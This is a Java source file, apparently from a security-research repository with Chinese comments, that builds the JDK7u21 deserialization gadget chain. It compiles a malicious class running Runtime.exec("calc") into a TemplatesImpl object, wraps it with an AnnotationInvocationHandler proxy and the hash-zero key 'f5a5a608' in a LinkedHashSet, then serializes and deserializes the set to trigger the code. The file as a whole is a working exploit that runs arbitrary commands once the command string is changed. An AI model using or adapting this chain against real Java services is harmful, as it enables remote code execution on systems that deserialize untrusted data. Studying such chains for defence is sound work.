package org.payload.yuansheng.JDK7u21;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

import static org.Tools.setClassPool.evilClass2;
import static org.Tools.setSerial.serial;
import static org.Tools.setTemplatesImpl.template;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        byte[] evilbyte = evilClass2("java.lang.Runtime.getRuntime().exec(\"calc\");");
        TemplatesImpl templates = template(evilbyte);
        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value随便设置一个值.
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "any");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(
                JDK7u21.class.getClassLoader(),
                new Class[]{Templates.class},
                tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, templates);

        byte[] barr = serial(set);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        ois.readObject();
    }
}
